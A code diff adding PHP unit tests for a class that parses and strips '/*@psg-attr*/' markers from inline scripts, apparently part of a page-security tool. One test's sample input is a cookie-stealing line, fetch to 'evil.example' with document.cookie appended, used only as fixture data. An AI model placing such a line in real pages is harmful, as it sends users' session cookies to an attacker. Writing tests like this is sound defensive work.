@@ -89,6 +89,25 @@ class InlineFingerprintTest extends TestCase
         $this->assertSame(['maps.googleapis.com'], $this->fingerprint->hosts($source));
     }
 
+    public function testAttributeMarkerIsRecognisedAndRemoved(): void
+    {
+        $source = "/*@psg-attr X-Init*/\nfetch('https://evil.example/c?d=' + document.cookie)";
+
+        $this->assertSame('x-init', $this->fingerprint->attributeName($source));
+        $this->assertSame(
+            "fetch('https://evil.example/c?d=' + document.cookie)",
+            $this->fingerprint->withoutAttributeMarker($source)
+        );
+        $this->assertSame('@click.prevent', $this->fingerprint->attributeName("/*@psg-attr @click.prevent*/\nx()"));
+    }
+
+    public function testInlineScriptsHaveNoAttributeName(): void
+    {
+        $this->assertNull($this->fingerprint->attributeName('/* a comment */ doSomething();'));
+        $this->assertNull($this->fingerprint->attributeName("var a = 1;\n/*@psg-attr onclick*/\nb();"));
+        $this->assertNull($this->fingerprint->attributeName("/*@psg-attr bad name!*/\nb();"));
+    }
+
     public function testPreviewIsSingleLineAndShortened(): void
     {
         $preview = $this->fingerprint->preview("line one\n\n   line two " . str_repeat('x', 300), 40);
